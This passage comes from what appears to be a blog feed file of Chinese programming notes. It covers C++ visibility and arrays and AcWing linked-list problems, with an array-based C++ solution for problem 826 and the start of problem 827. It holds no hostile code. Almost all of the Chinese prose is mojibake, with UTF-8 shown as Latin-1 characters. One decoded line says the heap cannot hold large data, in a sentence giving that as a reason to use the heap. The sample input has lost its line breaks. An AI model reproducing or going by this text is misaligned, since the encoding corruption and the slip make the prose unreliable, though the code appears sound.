‡ç±»å’Œå±‚æ¬¡ç»“æ„ä¸­çš„æ‰€æœ‰å­ç±»å¯ä»¥è®¿é—®è¿™äº›ç¬¦å·ã€‚</strong></li></ul><p>å¯è§æ€§çš„å¥½å¤„ï¼šç¡®ä¿äººä»¬ä¸ä¼šè°ƒç”¨ä¸è¯¥è°ƒç”¨çš„ä»£ç è¯¥ç ´åã€‚<br>ä¸€ä¸ªå…³äºUIçš„ä¾‹å­ï¼šä½¿ç”¨æŒ‰é’®æ”¹å˜ä½ç½®æ—¶å¦‚æœåªæ˜¯ä¿®æ”¹X=5ï¼Œæ˜¾ç¤ºå™¨ä¼šä½¿ç”¨å†…å­˜ä¸­æ—§çš„Xå€¼ï¼Œä¸€ä¸ªåšæ³•æ˜¯å£°æ˜Xä¸ºprivateï¼ˆæé†’è‡ªå·±å’Œä»–äººä¸è¦é€šè¿‡èµ‹å€¼ä¿®æ”¹Xï¼‰ï¼Œè€Œç»™å‡ºä¸€ä¸ªpublicçš„SetX()å…¶ä¸­å®ç°ä¿®æ”¹Xå¹¶åˆ·æ–°æ˜¾ç¤ºå™¨çš„åŠŸèƒ½ã€‚</p><h1 id="30-Arrays-in-C">30 Arrays in C++</h1><p><code>arr[-1]=0</code> Memory access violationã€‚<br>åœ¨Debugæ¨¡å¼ä¸‹ä¼šå¾—åˆ°ä¸€ä¸ªç¨‹åºå´©æºƒçš„é”™è¯¯ä¿¡æ¯ã€‚<br>ä½†åœ¨Releaseæ¨¡å¼ä¸‹å¯èƒ½ä¸ä¼šå¾—åˆ°æŠ¥é”™ä¿¡æ¯ï¼Œå·²ç»å†™å…¥äº†ä¸å±äºä½ çš„å†…å­˜ã€‚</p><p><code>&lt;=</code> è¿ç®—æ—¶ï¼Œåœ¨åšå°äºä»¥åŠç­‰äºçš„æ¯”è¾ƒâ€”â€”å½±å“æ€§èƒ½</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é”™è¯¯</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> arr[count];</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­£ç¡®</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> count = <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> arr[count];</span><br></pre></td></tr></table></figure><p><code>int arr[5];</code> æ˜¯åœ¨æ ˆä¸Šåˆ›å»ºæ•°ç»„ï¼Œä½œç”¨åŸŸç»“æŸæ—¶å†…å­˜é‡Šæ”¾ã€‚<br><code>**int* arr = new int[5];</code> åœ¨å †ä¸Šåˆ›å»ºæ•°ç»„ï¼Œç›´åˆ°ç¨‹åºæŠŠå®ƒé”€æ¯ä¹‹å‰éƒ½å­˜åœ¨ï¼Œé”€æ¯ï¼š<code>delete[] arr;</code> ã€‚**</p><p>åœ¨å †ä¸Šåˆ›å»ºæ•°ç»„çš„åŸå› ï¼šæœ€å¤§çš„åŸå› æ˜¯ç”Ÿå­˜æœŸï¼š**å¦‚æœæœ‰ä¸€ä¸ªå‡½æ•°éœ€è¦è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„åœ¨å‡½æ•°ä¸­åˆ›å»ºï¼Œåˆ™å¿…é¡»ä½¿ç”¨newï¼Œ**å¦ä¸€ä¸ªåŸå› æ˜¯æ•°æ®é‡å¤ªå¤§ï¼Œå †ä¸Šæ”¾ä¸ä¸‹ã€‚</p><p><strong>sizeof æ ˆæ•°ç»„ å¾—åˆ°æ•°ç»„å¤§å°</strong>ï¼Œsizeof å †æ•°ç»„ åªèƒ½å¾—åˆ°æ•°ç»„åœ°å€å¤§å°ã€‚</p><p>åœ¨å †ä¸Šåˆ›å»ºå†…å­˜ä¼šå¯¼è‡´ <strong>å†…å­˜é—´æ¥å¯»å€ï¼ˆMemory Indirectionï¼‰</strong>ï¼šä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å¦ä¸€ä¸ªå†…å­˜å—ï¼ˆä¿å­˜å®é™…çš„æ•°ç»„ï¼‰ã€‚å†…å­˜ä¸­è·³è·ƒå½±å“æ€§èƒ½ï¼Œè¿˜å¯èƒ½ä¼šå¯¼è‡´å†…å­˜ç¢ç‰‡ï¼ˆMemory fragmentationï¼‰ï¼Œç¼“å­˜ä¸¢å¤±ï¼ˆcache missï¼‰ã€‚</p><p>æ ‡å‡†æ•°ç»„ï¼šstd::array å†…ç½®åœ¨C++åº“ã€‚ä¼˜ç‚¹ï¼šè¾¹ç•Œæ£€æŸ¥ï¼Œè®°å½•æ•°ç»„å¤§å°ï¼Œè¿™ä¼šå¸¦æ¥è¾ƒå°çš„æ€§èƒ½æŸè€—ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::array&lt;<span class="type">int</span>, 5&gt; another;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> Cherno </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬2è®² æ•°æ®ç»“æ„</title>
      <link href="/2022/12/26/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-2-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2022/12/26/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-2-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="å•é“¾è¡¨">å•é“¾è¡¨</h1><h2 id="AcWing-826-å•é“¾è¡¨"><a href="https://www.acwing.com/problem/content/828/">AcWing 826. å•é“¾è¡¨</a></h2><p>å®ç°ä¸€ä¸ªå•é“¾è¡¨ï¼Œé“¾è¡¨åˆå§‹ä¸ºç©ºï¼Œæ”¯æŒä¸‰ç§æ“ä½œï¼š</p><ol><li>å‘é“¾è¡¨å¤´æ’å…¥ä¸€ä¸ªæ•°ï¼›</li><li>åˆ é™¤ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ’å…¥çš„æ•°åé¢çš„æ•°ï¼›</li><li>åœ¨ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ’å…¥çš„æ•°åæ’å…¥ä¸€ä¸ªæ•°ã€‚</li></ol><p>ç°åœ¨è¦å¯¹è¯¥é“¾è¡¨è¿›è¡Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> æ¬¡æ“ä½œï¼Œè¿›è¡Œå®Œæ‰€æœ‰æ“ä½œåï¼Œä»å¤´åˆ°å°¾è¾“å‡ºæ•´ä¸ªé“¾è¡¨ã€‚</p><p><strong>æ³¨æ„</strong>:é¢˜ç›®ä¸­ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ’å…¥çš„æ•°å¹¶ä¸æ˜¯æŒ‡å½“å‰é“¾è¡¨çš„ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ•°ã€‚ä¾‹å¦‚æ“ä½œè¿‡ç¨‹ä¸­ä¸€å…±æ’å…¥äº† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•°ï¼Œåˆ™æŒ‰ç…§æ’å…¥çš„æ—¶é—´é¡ºåºï¼Œè¿™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•°ä¾æ¬¡ä¸ºï¼šç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> ä¸ªæ’å…¥çš„æ•°ï¼Œç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> ä¸ªæ’å…¥çš„æ•°ï¼Œâ€¦ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ’å…¥çš„æ•°ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>ï¼Œè¡¨ç¤ºæ“ä½œæ¬¡æ•°ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªæ“ä½œå‘½ä»¤ï¼Œæ“ä½œå‘½ä»¤å¯èƒ½ä¸ºä»¥ä¸‹å‡ ç§ï¼š</p><ol><li><code>H x</code>ï¼Œè¡¨ç¤ºå‘é“¾è¡¨å¤´æ’å…¥ä¸€ä¸ªæ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>ã€‚</li><li><code>D k</code>ï¼Œè¡¨ç¤ºåˆ é™¤ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ’å…¥çš„æ•°åé¢çš„æ•°ï¼ˆå½“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> æ—¶ï¼Œè¡¨ç¤ºåˆ é™¤å¤´ç»“ç‚¹ï¼‰ã€‚</li><li><code>I k x</code>ï¼Œè¡¨ç¤ºåœ¨ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ’å…¥çš„æ•°åé¢æ’å…¥ä¸€ä¸ªæ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>ï¼ˆæ­¤æ“ä½œä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> å‡å¤§äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ï¼‰ã€‚</li></ol><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼Œå°†æ•´ä¸ªé“¾è¡¨ä»å¤´åˆ°å°¾è¾“å‡ºã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>M</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le M \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span><br>æ‰€æœ‰æ“ä½œä¿è¯åˆæ³•ã€‚</p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>10H 9I 1 1D 1D 0H 6I 3 6I 4 5I 4 5I 3 4D 6</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>6 4 6 5</code></pre><h3 id="æ•°ç»„æ¨¡æ‹Ÿå•é“¾è¡¨">æ•°ç»„æ¨¡æ‹Ÿå•é“¾è¡¨</h3><blockquote><p><mark>ä¸è¦é€šè¿‡scan(â€œ%câ€, &amp;op)</mark> è¯»å…¥æ“ä½œå­—ç¬¦ï¼šä¼šè¯»è¿›<code>\n</code></p><p>å¯ä»¥ä½¿ç”¨<code>scanf(&quot; %c&quot;, &amp;op)`` ``scanf(&quot; %c&quot;, &amp;c)</code>åœ¨%cä¹‹å‰ç©ºæ ¼ä¼šå‘Šè¯‰scanfå¿½ç•¥å‰é¢çš„ç©ºè¡Œï¼Œè€Œç­‰å¾…ç¬¬ä¸€ä¸ªéç©ºè¡Œå…ƒç´ è¯»å…¥å…¶ä¸­</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> e[kN], ne[kN], head, idx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  head = <span class="number">-1</span>, idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddToHead</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  e[idx] = x, ne[idx] = head, head = idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœ¨ä¸‹æ ‡ä¸ºkèŠ‚ç‚¹çš„åé¢æ’å…¥å€¼ä¸ºxçš„æ–°èŠ‚ç‚¹</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  e[idx] = x, ne[idx] = ne[k], ne[k] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ é™¤ä¸‹æ ‡ä¸ºkèŠ‚ç‚¹çš„åé¢ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Del</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">  ne[k] = ne[ne[k]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Init</span>();</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="type">char</span> op;</span><br><span class="line">  <span class="type">int</span> k, x;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;op);</span><br><span class="line">    <span class="comment">// cin &gt;&gt; op;</span></span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&#x27;H&#x27;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      <span class="built_in">AddToHead</span>(x);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;D&#x27;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line">      <span class="keyword">if</span> (!k) &#123;</span><br><span class="line">        head = ne[head];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">Del</span>(k - <span class="number">1</span>);  <span class="comment">// ç¬¬kä¸ªèŠ‚ç‚¹çš„ä¸‹æ ‡ä¸ºk-1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;k, &amp;x);</span><br><span class="line">      <span class="built_in">Insert</span>(k - <span class="number">1</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = head; i != <span class="number">-1</span>; i = ne[i]) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, e[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="åŒé“¾è¡¨">åŒé“¾è¡¨</h1><h2 id="AcWing-827-åŒé“¾è¡¨"><a href="https://www.acwing.com/problem/content/829/">AcWing 827. åŒé“¾è¡¨</a></h2><p>å®ç°ä¸€ä¸ªåŒé“¾è¡¨ï¼ŒåŒé“¾è¡¨åˆå§‹ä¸ºç©ºï¼Œæ”¯æŒ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> ç§æ“ä½œï¼š</p><ol><li>åœ¨æœ€å·¦ä¾§æ’å…¥ä¸€ä¸ªæ•°ï¼›</li><li>åœ¨æœ€å³ä¾§æ’å…¥ä¸€ä¸ªæ•°ï¼›</li><li>å°†ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ’å…¥çš„æ•°åˆ é™¤ï¼›</li><li>åœ¨ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ’å…¥çš„æ•°å·¦ä¾§æ’å…¥ä¸€ä¸ªæ•°ï¼›</li><li>åœ¨ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ’å…¥çš„æ•°å³ä¾§æ’å…¥ä¸€ä¸ªæ•°</li></ol><p>ç°åœ¨è¦å¯¹è¯¥é“¾è¡¨è¿›è¡Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> æ¬¡æ“ä½œï¼Œè¿›è¡Œå®Œæ‰€æœ‰æ“ä½œåï¼Œä»å·¦åˆ°å³è¾“å‡ºæ•´ä¸ªé“¾è¡¨ã€‚</p><p><strong>æ³¨æ„</strong>:é¢˜ç›®ä¸­ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ’å…¥çš„æ•°å¹¶ä¸æ˜¯æŒ‡å½“å‰é“¾è¡¨çš„ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ•°ã€‚ä¾‹å¦‚æ“ä½œè¿‡ç¨‹ä¸­ä¸€å…±æ’å…¥äº† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•°ï¼Œåˆ™æŒ‰ç…§æ’å…¥çš„æ—¶é—´é¡ºåºï¼Œè¿™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•°ä¾æ¬¡ä¸ºï¼šç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> ä¸ªæ’å…¥çš„æ•°ï¼Œç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> ä¸ªæ’å…¥çš„æ•°ï¼Œâ€¦ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ’å…¥çš„æ•°ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>ï¼Œè¡¨ç¤ºæ“ä½œæ¬¡æ•°ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span 